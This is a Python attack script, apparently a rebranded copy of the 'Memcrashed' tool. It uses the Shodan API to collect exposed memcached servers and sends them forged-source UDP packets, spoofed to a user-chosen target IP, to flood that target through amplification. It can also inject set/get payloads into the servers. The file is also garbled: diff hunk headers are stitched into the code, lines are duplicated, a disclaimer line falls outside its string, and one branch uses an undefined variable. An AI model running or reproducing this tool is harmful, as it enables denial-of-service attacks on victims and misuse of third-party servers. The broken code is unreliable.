#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout
starttime = time.time()
@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield
class color:
    HEADER = '\033[0m'
keys = Path("./api.txt")
logo = color.HEADER + '''
  /////////////////////////////////////////////////////
                                               ____  
   |\  |   ||||||   |\  |     /\     |\  /|   |
   | \ |   |    |   | \ |    /==\    | \/ |   |====
   |  \|   ||||||   |  \|   /    \   |    |   |____  
   
  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ 
  
                                  Author           : Mr.Noname
                                  Version          : 3.2
                                  Version          : 4.0
							      Instagram Team   : @panoc.team
								  Private Instagram: @mr_noname25
####################################### DISCLAIMER ########################################
'''
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
@@ -84,8 +84,15 @@ class color:
        if saveme.startswith('y') or query.startswith('y'):
            print('')
            target = input("[▸] Enter target IP address: ")
            targetport = input("[▸] Enter target port number (Default 80): ") or "80"
            power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
            data = input("[▸] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
            print('')
            data = input("[+] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
            if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                dataset = "set injected 0 3600 ", len(data)+1, "\r\n", data, "\r\n get injected\r\n"
                setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
                getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
                print("[+] Payload transformed: ", dataset)
            print('')
            if query.startswith('y'):
                iplist = input('[*] Would you like to display all the bots from Shodan? <Y/n>: ').lower()
@@ -112,24 +119,36 @@ class color:
            if engage.startswith('y'):
                if saveme.startswith('y'):
                    for i in ip_array:
                        if power>1:
                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
                        elif power==1:
                            print('[+] Sending 1 forged UDP packet to: %s' % i)
                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                            print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                        else:
                            if power>1:
                                print('[+] Sending %d forged UDP packets to: %s' % (power, i))
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                            elif power==1:
                                print('[+] Sending 1 forged UDP packet to: %s' % i)
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                else:
                    for result in results['matches']:
                        if power>1:
                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
                        elif power==1:
                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                            print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                        else:
                            if power>1:
                                print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                            elif power==1:
                                print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                print('')
                print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                break
            else:
                print('')
                print('[✘] Error: %s not engaged!' % target)
                print('[~] Restarting Platform! Please wait.')
                print('')
        else:
            print('')
            print('[✘] Error: No bots stored locally or remotely on Shodan!')
            print('[~] Restarting Platform! Please wait.')
            print('')
    except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
                file.write(SHODAN_API_KEY)
                print('[~] File written: ./api.txt')
                file.close()
                print('[~] Restarting Platform! Please wait.')
                print('')
            else:
                print('')
                print('[•] Exiting Platform. Have a wonderful day.')
                break